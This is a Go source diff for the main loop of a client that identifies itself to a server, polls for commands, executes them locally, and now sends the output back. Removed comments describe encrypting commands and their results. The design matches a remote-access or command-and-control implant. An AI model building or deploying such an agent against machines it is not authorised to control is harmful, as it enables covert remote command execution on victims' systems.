@@ -7,11 +7,8 @@ import (
 )
 
 func main() {
-	//clientConfig := GetClientConfig()
-	// post request to /client with payload {'id': clientID, 'pubKey': pubKey, 'hostName': hostName}, pubKey will be the key generated from the client thats used to encrypt the commands on the server side, will be decrypted client side.
-	// after the post request, the server will send us back a publicKey which is used to encrypt the output client side, which will be decrypted server side.
-	// get request to /command to receive command, post request /command with {'output': encryptedOP}
 
+	// create client
 	client := core.Client{}
 
 	if !client.InitClient() {
@@ -21,7 +18,7 @@ func main() {
 	_, err := client.IdentifyToServer()
 
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("Failed To Identify Client To Server, Error: ", err)
 		return
 	}
 
@@ -33,19 +30,18 @@ func main() {
 			continue
 		}
 
-		if len(client.History) > 0 {
-			lastExec := client.GetLastExecutedCmd()
+		lastExec := client.GetLastExecutedCmd()
 
+		if lastExec != core.EmptyCommand {
 			// if the server doesnt have a new command, continue
-			// next version will use a queue structure to handle commands.
 			if lastExec.Id == cmd.Id {
 				continue
 			}
 
 		}
 
-		// no command, continue
-		if cmd.Content == "N/A" {
+		// no issued command, continue
+		if cmd == core.EmptyCommand {
 			continue
 		}
 
@@ -53,14 +49,13 @@ func main() {
 
 		excCmd := client.ExecuteCmd(*cmd)
 
-		output, err := excCmd.Output()
+		sErr := client.SendCmdOutput(excCmd, cmd.Id)
 
-		if err != nil {
+		if sErr != nil {
 			continue
 		}
 
-		// next update, we will send the output (encrypted) back to server, for now just print it.
-		fmt.Println(string(output))
+		fmt.Println("Sent Output!")
 
 	}
 }
